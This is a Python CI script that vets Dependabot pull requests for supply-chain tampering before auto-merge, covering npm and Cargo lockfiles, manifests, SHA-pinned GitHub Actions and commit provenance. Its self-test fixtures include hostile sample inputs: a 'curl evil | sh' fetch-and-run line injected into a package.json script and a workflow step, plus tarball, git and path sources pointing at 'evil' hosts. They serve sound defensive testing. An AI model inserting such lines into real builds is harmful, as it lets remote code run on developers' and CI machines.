#!/usr/bin/env python3
"""Supply-chain checks a Dependabot PR must pass before auto-merge.

Reads the PR through git only (`git diff` / `git show` on fetched commits),
so nothing from the PR is executed. Fails closed on anything it does not
recognise:

- Only existing manifests, lockfiles and workflow/action YAML may be
  modified, plus the `npmDepsHash` line in flake.nix that
  nix-npm-hash-fix-pr.yml pushes. No file is added, deleted or renamed.
- Manifests: only dependency version requirements change.
- npm: registry entries use their canonical registry.npmjs.org tarball and
  integrity; links remain unchanged and existing bundles change versions only.
  No entry gains `hasInstallScript` or changes its linked/bundled state.
- cargo: every new or changed `Cargo.lock` package comes from crates.io.
- GitHub Actions: only `uses:` lines change, each keeps its action, pins a
  40-hex SHA with a `# <tag>` comment, and that tag resolves upstream to the
  same commit.

Usage:
    python3 .github/scripts/check-dependabot-pr.py --base <sha> --head <sha>
    Add --repo <owner/repo> --pr <number> to enforce commit provenance too.
    Hash fixes need a nonexpired artifact from the trusted base workflow;
    older unsigned commits without that proof require manual handling.
    python3 .github/scripts/check-dependabot-pr.py --self-test
"""

import argparse
import json
import re
import subprocess
import sys
import tomllib
from pathlib import PurePosixPath
from urllib.parse import quote

NPM_REGISTRY = "https://registry.npmjs.org/"
CRATES_IO_SOURCES = {
    "registry+https://github.com/rust-lang/crates.io-index",
    "sparse+https://index.crates.io/",
}
NAME = r"[A-Za-z0-9][\w.-]*"
PINNED_USES = re.compile(
    rf"^\+\s*(?:-\s*)?uses:\s*({NAME})/({NAME})((?:/{NAME})*)@([0-9a-f]{{40}})\s+#\s*(v?[0-9][\w.+-]*)\s*$"
)
REMOVED_USES = re.compile(rf"^-\s*(?:-\s*)?uses:\s*({NAME}/{NAME}(?:/{NAME})*)@\S+(?:\s+#.*)?$")
# A version requirement only: no path, git, URL, alias or workspace specifier.
VERSION_REQ = re.compile(r"^[\w.^~<>=*|, +-]+$")
DEP_TABLES = {"dependencies", "dev-dependencies", "build-dependencies",
              "devDependencies", "optionalDependencies", "peerDependencies"}
NPM_DEPS_HASH = re.compile(r'^[+-]\s*npmDepsHash = "sha256-[A-Za-z0-9+/]{43}=";$')


def is_workflow_yaml(path):
    p = PurePosixPath(path)
    if p.suffix not in (".yml", ".yaml"):
        return False
    if p.parent == PurePosixPath(".github/workflows"):
        return True
    return p.parts[:2] == (".github", "actions") and p.stem == "action"


def classify(path):
    name = PurePosixPath(path).name
    if name == "package-lock.json":
        return "npm-lock"
    if name == "Cargo.lock":
        return "cargo-lock"
    if name in ("package.json", "Cargo.toml"):
        return "manifest"
    if path == "flake.nix":
        return "nix-hash"
    if is_workflow_yaml(path):
        return "actions"
    return None


def npm_tarball(key, entry):
    name = entry.get("name") or key.rpartition("node_modules/")[2]
    return f"{NPM_REGISTRY}{name}/-/{name.rpartition('/')[2]}-{entry.get('version')}.tgz"


def bundled_metadata(entry, path, problems):
    out = dict(entry)
    if "version" in out:
        version = out["version"]
        if not isinstance(version, str) or not VERSION_REQ.fullmatch(version):
            problems.append(f"{path}: invalid bundled version {version!r}")
        out["version"] = None
    for table in ("dependencies", "optionalDependencies", "peerDependencies"):
        if table in out:
            out[table] = strip_versions(out[table], path, problems, in_deps=True)
    return out


def check_npm_lock(path, base_text, head_text):
    problems = []
    base_doc, head_doc = json.loads(base_text), json.loads(head_text)
    if {k: v for k, v in base_doc.items() if k != "packages"} != {k: v for k, v in head_doc.items() if k != "packages"}:
        problems.append(f"{path}: changes more than `packages`")
    base = base_doc.get("packages", {})
    head = head_doc.get("packages", {})
    for key, entry in head.items():
        if key == "":
            continue
        before = base.get(key)
        if before == entry:
            continue
        where = f"{path}: {key}"
        if entry.get("hasInstallScript") and not (before or {}).get("hasInstallScript"):
            problems.append(f"{where}: adds an install script")
        before_flags = ((before or {}).get("link"), (before or {}).get("inBundle"))
        after_flags = (entry.get("link"), entry.get("inBundle"))
        if any(before_flags) or any(after_flags):
            if before is None or before_flags != after_flags:
                problems.append(f"{where}: changes linked or bundled state")
            elif entry.get("link"):
                problems.append(f"{where}: changes a linked entry")
            elif bundled_metadata(before, where, []) != bundled_metadata(entry, where, problems):
                problems.append(f"{where}: changes more than bundled dependency versions")
            continue
        resolved = entry.get("resolved", "")
        if resolved != npm_tarball(key, entry):
            problems.append(f"{where}: resolves from {resolved or '<missing>'}, not {npm_tarball(key, entry)}")
        if not entry.get("integrity"):
            problems.append(f"{where}: no integrity hash")
    return problems


def check_cargo_lock(path, base_text, head_text):
    problems = []

    def packages(text):
        return tomllib.loads(text).get("package", []) if text else []

    base_doc, head_doc = tomllib.loads(base_text), tomllib.loads(head_text)
    if {k: v for k, v in base_doc.items() if k != "package"} != {k: v for k, v in head_doc.items() if k != "package"}:
        problems.append(f"{path}: changes more than `package` entries")
    base = packages(base_text)
    workspace = {p["name"] for p in base if "source" not in p}
    seen = {(p["name"], p["version"], p.get("source")) for p in base}
    for pkg in packages(head_text):
        key = (pkg["name"], pkg["version"], pkg.get("source"))
        if key in seen:
            continue
        where = f"{path}: {pkg['name']} {pkg['version']}"
        source = pkg.get("source")
        if source is None:
            if pkg["name"] not in workspace:
                problems.append(f"{where}: new package with no source")
        elif source not in CRATES_IO_SOURCES:
            problems.append(f"{where}: comes from {source}")
        elif not pkg.get("checksum"):
            problems.append(f"{where}: no checksum")
    return problems


def strip_versions(node, path, problems, in_deps=False):
    """Returns `node` with dependency version requirements blanked, noting malformed ones."""
    if isinstance(node, dict):
        if in_deps:
            out = {}
            for name, spec in node.items():
                if isinstance(spec, dict):
                    spec = dict(spec)
                    version = spec.pop("version", None)
                else:
                    version, spec = spec, None
                if version is not None and not (isinstance(version, str) and VERSION_REQ.match(version)):
                    problems.append(f"{path}: {name} has a non-registry requirement {version!r}")
                out[name] = (spec, version is not None)
            return out
        return {k: strip_versions(v, path, problems, k in DEP_TABLES) for k, v in node.items()}
    if isinstance(node, list):
        return [strip_versions(v, path, problems) for v in node]
    return node


def check_manifest(path, base_text, head_text):
    parse = json.loads if path.endswith(".json") else tomllib.loads
    problems = []
    if strip_versions(parse(base_text), path, []) != strip_versions(parse(head_text), path, problems):
        problems.append(f"{path}: changes more than dependency versions")
    return problems


def diff_changes(diff_text):
    return [
        line for line in diff_text.splitlines()
        if line[:1] in "+-" and not line.startswith(("+++ ", "--- "))
    ]


def check_actions_diff(path, diff_text, resolve_tag):
    """`resolve_tag(owner, repo, tag)` returns the commit SHA the tag points at."""
    problems = []
    removed, added = [], []
    for line in diff_changes(diff_text):
        if line.startswith("-"):
            m = REMOVED_USES.match(line)
            if not m:
                problems.append(f"{path}: removes a line other than `uses:`: {line[1:].strip()}")
            else:
                removed.append(m.group(1))
            continue
        m = PINNED_USES.match(line)
        if not m:
            problems.append(f"{path}: not a SHA-pinned `uses:` with a tag comment: {line[1:].strip()}")
            continue
        owner, repo, subpath, sha, tag = m.groups()
        added.append(f"{owner}/{repo}{subpath}")
        try:
            actual = resolve_tag(owner, repo, tag)
        except Exception as e:  # noqa: BLE001 - any lookup failure fails closed
            problems.append(f"{path}: cannot resolve {owner}/{repo}@{tag}: {e}")
            continue
        if actual != sha:
            problems.append(f"{path}: {owner}/{repo} {tag} is {actual}, PR pins {sha}")
    if sorted(removed) != sorted(added):
        problems.append(f"{path}: `uses:` actions change from {sorted(removed)} to {sorted(added)}")
    return problems


def check_nix_hash_diff(path, diff_text):
    changes = diff_changes(diff_text)
    if (len(changes) == 2 and changes[0].startswith("-") and changes[1].startswith("+")
            and all(NPM_DEPS_HASH.match(line) for line in changes)):
        return []
    return [f"{path}: changes more than the npmDepsHash line"]


def check(changed, read, diff, resolve_tag):
    """`changed` lists (status, path); `read(rev, path)` returns text; `diff(path)` returns a -U0 diff."""
    problems = []
    for status, path in changed:
        kind = classify(path)
        if kind is None:
            problems.append(f"{path}: not a file Dependabot auto-merge may change")
        elif status != "M":
            problems.append(f"{path}: status {status}, only modifications are allowed")
        elif kind == "npm-lock":
            problems += check_npm_lock(path, read("base", path), read("head", path))
        elif kind == "cargo-lock":
            problems += check_cargo_lock(path, read("base", path), read("head", path))
        elif kind == "manifest":
            problems += check_manifest(path, read("base", path), read("head", path))
        elif kind == "actions":
            problems += check_actions_diff(path, diff(path), resolve_tag)
        elif kind == "nix-hash":
            problems += check_nix_hash_diff(path, diff(path))
    return problems


def git(*args):
    return subprocess.run(
        ["git", "--literal-pathspecs", *args], check=True, capture_output=True, text=True
    ).stdout


def gh_api(endpoint, paginate=False):
    args = ["gh", "api", endpoint]
    if paginate:
        args += ["--paginate", "--slurp"]
    out = subprocess.run(args, check=True, capture_output=True, text=True).stdout
    return json.loads(out)


def is_hash_fix_artifact(artifact, run, repo, name, workflow_id):
    return (
        artifact.get("name") == name
        and artifact.get("expired") is False
        and (artifact.get("workflow_run") or {}).get("id") == run.get("id")
        and run.get("workflow_id") == workflow_id
        and run.get("event") == "pull_request_target"
        and run.get("path") == ".github/workflows/nix-npm-hash-fix-pr.yml"
        and (run.get("repository") or {}).get("full_name") == repo
        and (run.get("head_repository") or {}).get("full_name") == repo
    )


def trusted_hash_fix(repo, pr, sha):
    name = f"nix-npm-hash-fix-{pr}-{sha}"
    pages = gh_api(f"repos/{repo}/actions/artifacts?name={name}&per_page=100", paginate=True)
    artifacts = [a for page in pages for a in page["artifacts"]
                 if a.get("name") == name and a.get("expired") is False]
    if not artifacts:
        return False
    workflow_id = gh_api(f"repos/{repo}/actions/workflows/nix-npm-hash-fix-pr.yml")["id"]
    for artifact in artifacts:
        run_id = artifact["workflow_run"]["id"]
        run = gh_api(f"repos/{repo}/actions/runs/{run_id}")
        if is_hash_fix_artifact(artifact, run, repo, name, workflow_id):
            return True
    return False


def check_commits(commits, expected_shas, inspect, trusted):
    shas = [c["sha"] for c in commits]
    if len(shas) != len(expected_shas) or set(shas) != set(expected_shas):
        return ["PR commits differ from the fetched head; refusing stale or incomplete metadata"]
    problems = []
    for commit in commits:
        sha = commit["sha"]
        author = (commit.get("author") or {}).get("login")
        verified = commit["commit"].get("verification", {}).get("verified") is True
        if author == "dependabot[bot]" and verified:
            continue
        if author != "github-actions[bot]":
            problems.append(f"{sha}: not a verified Dependabot commit or a trusted hash fix")
            continue
        parents, changed, diff_text = inspect(sha)
        if len(parents) != 1 or changed != [("M", "flake.nix")]:
            problems.append(f"{sha}: hash fix must have one parent and modify only flake.nix")
        elif check_nix_hash_diff("flake.nix", diff_text):
            problems.append(f"{sha}: hash fix changes more than the canonical npmDepsHash line")
        elif not trusted(sha):
            problems.append(f"{sha}: no authentic hash-fixer artifact for this PR and commit")
    return problems


def resolve_tag_upstream(owner, repo, tag):
    obj = gh_api(f"repos/{owner}/{repo}/git/ref/tags/{quote(tag, safe='')}")["object"]
    # Annotated tags point at a tag object; peel to the commit.
    for _ in range(5):
        if obj["type"] == "commit":
            return obj["sha"]
        if obj["type"] != "tag":
            raise ValueError(f"tag points at a {obj['type']}")
        obj = gh_api(f"repos/{owner}/{repo}/git/tags/{obj['sha']}")["object"]
    raise ValueError("tag chain too deep")


def run(base, head, repo=None, pr=None):
    merge_base = git("merge-base", base, head).strip()
    revs = {"base": merge_base, "head": head}

    def read(rev, path):
        return git("show", f"{revs[rev]}:{path}")

    def diff(path):
        return git("diff", "--no-ext-diff", "--no-textconv", "-U0", merge_base, head, "--", path)

    fields = git("diff", "--name-status", "--no-renames", "-z", merge_base, head).split("\0")[:-1]
    changed = list(zip(fields[0::2], fields[1::2]))
    problems = check(changed, read, diff, resolve_tag_upstream)
    if repo is not None:
        commits = [c for page in gh_api(f"repos/{repo}/pulls/{pr}/commits?per_page=100", paginate=True) for c in page]
        expected = git("rev-list", f"{merge_base}..{head}").splitlines()

        def inspect(sha):
            parents = git("rev-list", "--parents", "-n", "1", sha).split()[1:]
            if len(parents) != 1:
                return parents, [], ""
            fields = git("diff", "--name-status", "--no-renames", "-z", parents[0], sha).split("\0")[:-1]
            changed = list(zip(fields[0::2], fields[1::2]))
            diff_text = git("diff", "--no-ext-diff", "--no-textconv", "-U0", parents[0], sha, "--", "flake.nix")
            return parents, changed, diff_text

        problems += check_commits(commits, expected, inspect, lambda sha: trusted_hash_fix(repo, pr, sha))
    return problems


def self_test():
    sha_a, sha_b = "a" * 40, "b" * 40
    bundle_entry = {"version": "1.0.0", "inBundle": True, "dependencies": {"left-pad": "^1.0.0"}}
    npm_base = json.dumps({"packages": {
        "": {"name": "web"},
        "node_modules/left-pad": {"version": "1.0.0", "resolved": NPM_REGISTRY + "left-pad/-/left-pad-1.0.0.tgz", "integrity": "sha512-x"},
        "node_modules/esbuild": {"version": "0.1.0", "resolved": NPM_REGISTRY + "esbuild/-/esbuild-0.1.0.tgz", "integrity": "sha512-x", "hasInstallScript": True},
        "node_modules/bundle": bundle_entry,
        "node_modules/link": {"link": True, "resolved": "../workspace"},
    }})

    def npm_head(**changes):
        data = json.loads(npm_base)
        for key, entry in changes.items():
            data["packages"][f"node_modules/{key}"] = entry
        return json.dumps(data)

    good_entry = {"version": "1.1.0", "resolved": NPM_REGISTRY + "left-pad/-/left-pad-1.1.0.tgz", "integrity": "sha512-y"}
    cargo_base = (
        '[[package]]\nname = "agent-of-empires"\nversion = "1.0.0"\n\n'
        '[[package]]\nname = "serde"\nversion = "1.0.0"\n'
        'source = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "aa"\n'
    )
    cargo_ok = cargo_base.replace('version = "1.0.0"\nsource', 'version = "1.0.1"\nsource')
    cargo_git = cargo_base + '\n[[package]]\nname = "evil"\nversion = "0.1.0"\nsource = "git+https://example.com/evil#abc"\n'

    cargo_toml = '[package]\nname = "agent-of-empires"\n\n[dependencies]\nserde = "1.0.0"\ntokio = { version = "1.0", features = ["full"] }\n'
    pkg_json = json.dumps({"name": "web", "scripts": {"build": "vite build"}, "dependencies": {"left-pad": "^1.0.0"}})

    def resolver(owner, repo, tag):
        return {"v2.0.0": sha_a}[tag]

    old_co = "-      - uses: actions/checkout@" + sha_b + " # v1.0.0\n"
    nix_old = '-  npmDepsHash = "sha256-' + "A" * 43 + '=";\n'
    nix_new = '+  npmDepsHash = "sha256-' + "B" * 43 + '=";\n'
    lock = "web/package-lock.json"
    wf = ".github/workflows/ci.yml"
    cases = [
        ("npm registry bump", [lock], {lock: (npm_base, npm_head(**{"left-pad": good_entry}))}, "", 0),
        ("npm foreign tarball", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "resolved": "https://evil.example/x.tgz"}}))}, "", 1),
        ("npm other registry package", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "resolved": NPM_REGISTRY + "evil/-/evil-1.1.0.tgz"}}))}, "", 1),
        ("npm new install script", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "hasInstallScript": True}}))}, "", 1),
        ("npm existing install script", [lock], {lock: (npm_base, npm_head(esbuild={"version": "0.2.0", "resolved": NPM_REGISTRY + "esbuild/-/esbuild-0.2.0.tgz", "integrity": "sha512-z", "hasInstallScript": True}))}, "", 0),
        ("npm missing integrity", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "integrity": ""}}))}, "", 1),
        ("npm registry becomes bundle", [lock], {lock: (npm_base, npm_head(**{"left-pad": {"version": "1.1.0", "inBundle": True, "resolved": "https://evil.example/x.tgz", "hasInstallScript": True}}))}, "", 1),
        ("npm registry becomes link", [lock], {lock: (npm_base, npm_head(**{"left-pad": {"link": True, "resolved": "../evil"}}))}, "", 1),
        ("npm bundled script acquisition", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "hasInstallScript": True}))}, "", 1),
        ("npm bundled version requirements", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "version": "1.1.0", "dependencies": {"left-pad": "^1.1.0"}}))}, "", 0),
        ("npm bundled source change", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "resolved": "https://evil.example/x.tgz"}))}, "", 1),
        ("npm bundled name change", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "name": "evil"}))}, "", 1),
        ("npm bundled dependency acquisition", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "dependencies": {"left-pad": "^1.0.0", "evil": "^1.0.0"}}))}, "", 1),
        ("npm bundled git requirement", [lock], {lock: (npm_base, npm_head(bundle={**bundle_entry, "dependencies": {"left-pad": "github:evil/x"}}))}, "", 1),
        ("npm bundled version presence", [lock], {lock: (npm_base, npm_head(bundle={k: v for k, v in bundle_entry.items() if k != "version"}))}, "", 1),
        ("npm bundle becomes registry", [lock], {lock: (npm_base, npm_head(bundle={"version": "1.0.0", "resolved": NPM_REGISTRY + "bundle/-/bundle-1.0.0.tgz", "integrity": "sha512-x"}))}, "", 1),
        ("npm link retargeting", [lock], {lock: (npm_base, npm_head(link={"link": True, "resolved": "../evil"}))}, "", 1),
        ("npm new bundled entry", [lock], {lock: (npm_base, npm_head(newbundle=bundle_entry))}, "", 1),
        ("npm top-level change", [lock], {lock: (npm_base, json.dumps({**json.loads(npm_base), "lockfileVersion": 1}))}, "", 1),
        ("npm deleted lockfile", [("D", lock)], {}, "", 1),
        ("cargo crates.io bump", ["Cargo.lock", "Cargo.toml"], {"Cargo.lock": (cargo_base, cargo_ok), "Cargo.toml": (cargo_toml, cargo_toml.replace('"1.0.0"', '"1.0.1"').replace('"1.0"', '"1.2"'))}, "", 0),
        ("cargo git source", ["Cargo.lock"], {"Cargo.lock": (cargo_base, cargo_git)}, "", 1),
        ("cargo manifest feature", ["Cargo.toml"], {"Cargo.toml": (cargo_toml, cargo_toml.replace('["full"]', '["full", "x"]'))}, "", 1),
        ("cargo manifest path dep", ["Cargo.toml"], {"Cargo.toml": (cargo_toml, cargo_toml.replace('serde = "1.0.0"', 'serde = { path = "../evil" }'))}, "", 1),
        ("cargo manifest patch", ["Cargo.toml"], {"Cargo.toml": (cargo_toml, cargo_toml + '\n[patch.crates-io]\nserde = { git = "https://example.com/evil" }\n')}, "", 1),
        ("npm manifest bump", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "^1.1.0"))}, "", 0),
        ("npm manifest script", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("vite build", "curl evil | sh"))}, "", 1),
        ("npm manifest git dep", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "github:evil/left-pad"))}, "", 1),
        ("actions matching tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2.0.0\n", 0),
        ("actions subpath", [".github/actions/x/action.yml"], {}, f"-    - uses: github/codeql-action/init@{sha_b} # v1.0.0\n+    - uses: github/codeql-action/init@{sha_a} # v2.0.0\n", 0),
        ("actions mismatched tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_b} # v2.0.0\n", 1),
        ("actions unknown tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v9\n", 1),
        ("actions unpinned", [wf], {}, old_co + "+      - uses: actions/checkout@v2\n", 1),
        ("actions other repo", [wf], {}, old_co + f"+      - uses: evil/checkout@{sha_a} # v2.0.0\n", 1),
        ("actions extra run line", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2.0.0\n+      - run: curl evil | sh\n", 1),
        ("actions removed step", [wf], {}, "-      - run: cargo deny check\n", 1),
        ("actions traversal tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2/../../evil\n", 1),
        ("deleted workflow", [("D", wf)], {}, "", 1),
        ("nix hash only", ["flake.nix"], {}, nix_old + nix_new, 0),
        ("nix duplicate hash additions", ["flake.nix"], {}, nix_new + nix_new, 1),
        ("nix hash removal only", ["flake.nix"], {}, nix_old + nix_old, 1),
        ("nix other line", ["flake.nix"], {}, nix_old + nix_new + "+  src = ./evil;\n", 1),
        ("unexpected file", ["build.rs"], {}, "", 1),
    ]
    failed = 0
    for name, changed, files, diff_text, expected in cases:
        def read(rev, path, files=files):
            return files[path][0 if rev == "base" else 1]

        changed = [c if isinstance(c, tuple) else ("M", c) for c in changed]
        problems = check(changed, read, lambda _p, d=diff_text: d, resolver)
        if (len(problems) > 0) != bool(expected):
            failed += 1
            print(f"FAIL {name}: {problems}")
    repo, pr, workflow_id = "owner/repo", 42, 7
    artifact_name = f"nix-npm-hash-fix-{pr}-{sha_b}"
    artifact = {"name": artifact_name, "expired": False, "workflow_run": {"id": 8}}
    producer = {"id": 8, "workflow_id": workflow_id, "event": "pull_request_target",
                "path": ".github/workflows/nix-npm-hash-fix-pr.yml",
                "repository": {"full_name": repo}, "head_repository": {"full_name": repo}}
    provenance_cases = [
        ("authentic producer", artifact, producer, True),
        ("wrong PR", {**artifact, "name": f"nix-npm-hash-fix-43-{sha_b}"}, producer, False),
        ("wrong SHA", {**artifact, "name": f"nix-npm-hash-fix-{pr}-{sha_a}"}, producer, False),
        ("expired proof", {**artifact, "expired": True}, producer, False),
        ("different run", artifact, {**producer, "id": 9}, False),
        ("different workflow", artifact, {**producer, "workflow_id": 9}, False),
        ("PR-controlled producer", artifact, {**producer, "event": "pull_request"}, False),
        ("wrong workflow path", artifact, {**producer, "path": ".github/workflows/ci.yml"}, False),
        ("wrong repository", artifact, {**producer, "repository": {"full_name": "other/repo"}}, False),
        ("fork producer", artifact, {**producer, "head_repository": {"full_name": "other/repo"}}, False),
    ]
    for name, proof, run, expected in provenance_cases:
        if is_hash_fix_artifact(proof, run, repo, artifact_name, workflow_id) != expected:
            failed += 1
            print(f"FAIL provenance {name}")

    dependabot = {"sha": sha_a, "author": {"login": "dependabot[bot]"},
                  "commit": {"verification": {"verified": True}}}
    fixer = {"sha": sha_b, "author": {"login": "github-actions[bot]"},
             "commit": {"verification": {"verified": False}}}
    commit_cases = [
        ("signed Dependabot and unsigned authentic fix", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a, sha_b], False),
        ("major version in claimed hash fix", fixer, [sha_a], [("M", "web/package.json")], "", True, [sha_a, sha_b], True),
        ("hash fix with extra file", fixer, [sha_a], [("M", "flake.nix"), ("M", "web/package.json")], nix_old + nix_new, True, [sha_a, sha_b], True),
        ("hash fix with extra line", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new + "+  src = ./evil;", True, [sha_a, sha_b], True),
        ("unattested unsigned hash", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new, False, [sha_a, sha_b], True),
        ("unattested signed hash", {**fixer, "commit": {"verification": {"verified": True}}}, [sha_a], [("M", "flake.nix")], nix_old + nix_new, False, [sha_a, sha_b], True),
        ("merge hash fix", fixer, [sha_a, "c" * 40], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a, sha_b], True),
        ("unsigned claimed Dependabot", {**fixer, "author": {"login": "dependabot[bot]"}}, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a, sha_b], True),
        ("stale or incomplete API commits", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a], True),
    ]
    for name, commit, parents, changed, diff_text, authentic, expected_shas, expected in commit_cases:
        problems = check_commits([dependabot, commit], expected_shas,
                                 lambda _sha: (parents, changed, diff_text), lambda _sha: authentic)
        if bool(problems) != expected:
            failed += 1
            print(f"FAIL commits {name}: {problems}")
    total = len(cases) + len(provenance_cases) + len(commit_cases)
    print(f"{total - failed}/{total} self-test cases passed")
    return 1 if failed else 0


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--base")
    parser.add_argument("--head")
    parser.add_argument("--repo")
    parser.add_argument("--pr", type=int)
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        return self_test()
    if not (args.base and args.head):
        parser.error("--base and --head are required")
    if (args.repo is None) != (args.pr is None):
        parser.error("--repo and --pr must be supplied together")
    problems = run(args.base, args.head, args.repo, args.pr)
    for p in problems:
        print(f"::error::{p}")
    if problems:
        return 1
    print("All Dependabot supply-chain checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
